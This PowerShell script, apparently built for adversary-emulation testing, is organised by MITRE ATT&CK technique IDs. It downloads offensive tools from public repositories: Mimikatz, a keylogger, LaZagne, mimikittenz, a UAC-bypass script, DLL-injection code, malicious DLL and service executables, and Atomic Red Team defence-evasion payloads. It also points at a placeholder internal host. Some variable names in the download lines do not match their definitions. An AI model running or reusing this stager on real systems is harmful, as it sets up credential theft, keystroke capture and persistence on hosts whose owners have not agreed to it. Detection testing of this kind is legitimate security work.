[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#COLLECTION

$T1074_bat = "$currentdir\T1074.bat"
$T1115_readme_txt = "$currentdir\T1115.txt"

$T1074_download = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.bat"
$T1115_readme = "https://raw.githubusercontent.com/madhavbhatt/Web-Based-Command-Control/master/README.md"

#CREDACCESS

$T1003_mimikatz = "$currentdir\T1003.ps1"
$T1056_keystrokes = "$currentdir\T1056.ps1"
$T1003_gsecdump = "$currentdir\gsecdump.exe"
$T1003_wce      = "$currentdir\wce.exe"
$T1081_lazagne  = "$currentdir\laZagne.py"
$T1081_mimikittenz = "$currentdir\T1081.ps1"
$T1110_remote_host = "10.10.10.10"
$T1110_domain = "XYZ"


$T1003_mimikatz_download = "https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
$T1056_download = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056/Get-Keystrokes.ps1"
$T1081_lazagne_download = "https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/Windows/laZagne.py"
$T1081_mimikittenz_download = "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1"

#DEFENSEEVASION

$T1085_sct      = "$currentdir\T1085.sct"
$T1117_sct      = "$currentdir\T1117.sct"
$T1117_dll      = "$currentdir\T1117.dll"
$T1118_cs       = "$currentdir\T1118.cs"
$T1121_cs       = "$currentdir\T1121.sct"
$T1122_ps       = "$currentdir\T1122.ps1" 
$T1127_csproj   = "$currentdir\T1127.csproj"
$T1191_inf      = "$currentdir\T1191.inf"

$T1070_logfile      = "system"
$T1085_sct_download = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct"
$T1117_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct"
$T1117_dll_download = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll"
$T1118_cs_download  = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1118/src/T1118.cs"
$T1121_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1121/src/T1121.cs"
$T1122_download     = "https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1"
$T1127_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1127/src/T1127.csproj"
$T1170_download     = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct"
$T1191_download      = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1191/T1191.inf"
$T1202_javacpl_path = "c:\ProgramFiles(x86)\Java\jre1.8.0_181\bin\javacpl.cpl"


#PERSISTENCE

$T1015_malicious_executable_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe"
$T1015_target_executable="sethc.exe"
$T1031_changed_binary_for_service="c:\windows\system32\calc.exe"
$T1084_wmi_persistent_script_url_download="http://10.10.10.10/a"
$T1103_appinit_dll_download="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1103/T1103.reg"
$T1138_appplication_shimming_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/src/AtomicShimx86.sdb"
$T1179_malicious_dll_download="https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/src/x64/T1179.dll"
$T1179_pid=$(Get-Process -Name wininit).Id
$T1197_BITS_download="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"


$T1015_exe = "$currentdir\T1015.exe"
$T1103_reg = "$currentdir\T1103.reg"
$1138_sdb  = "$currentdir\T1138.sdb"
$T1179_dll = "$currentdir\T1179.dll"



# PRIVESC 

$T1055_ps = "$currentdir\T1055.ps1"
$T1134_ps = "$currentdir\T1134.ps1"

$T1055_invoke_dll_injection_download = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1"
$T1134_access_token_download = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134/src/T1134.ps1"

Invoke-WebRequest -Uri $T1074_download -OutFile $T1074_bat
Invoke-WebRequest -Uri $T1074_download -OutFile $T1115_readme_txt

Invoke-WebRequest -Uri $T1003_mimikatz_download    -OutFile $T1003_mimikatz 
Invoke-WebRequest -Uri $T1056_download             -OutFile $T1056_keystrokes
Invoke-WebRequest -Uri $T1081_lazagne_download     -OutFile $T1081_lazagne
Invoke-WebRequest -Uri $T1081_mimikittenz_download -OutFile $T1081_mimikittenz

Invoke-WebRequest -Uri $T1085_sct_download -OutFile $T1085_sct
Invoke-WebRequest -Uri $T1117_download     -OutFile $T1117_sct
Invoke-WebRequest -Uri $T1117_dll_download -OutFile $T1117_dll
Invoke-WebRequest -Uri $T1118_cs_download  -OutFile $T1118_cs
Invoke-WebRequest -Uri $T1121_download     -OutFile $T1121_cs
Invoke-WebRequest -Uri $T1122_download     -OutFile $T1122_ps
Invoke-WebRequest -Uri $T1127_download     -OutFile $T1127_csproj
Invoke-WebRequest -Uri $T1191_download     -OutFile $T1191_inf

Invoke-WebRequest -Uri $T1015_malicious_executable_download  -OutFile $T1015_exe
Invoke-WebRequest -Uri $T1103_appinit_dll_download           -OutFile $T1103_reg
Invoke-WebRequest -Uri $T1138_appplication_shimming_download -Outfile $1138_sdb
Invoke-WebRequest -Uri $T1179_malicious_dll_download         -Outfile $T1179_dll
Invoke-WebRequest -Uri $T1055_invoke_dll_injection_download -OutFile $T1055_ps1
Invoke-WebRequest -Uri $T1134_access_token_download         -OutFile $T1134_ps1
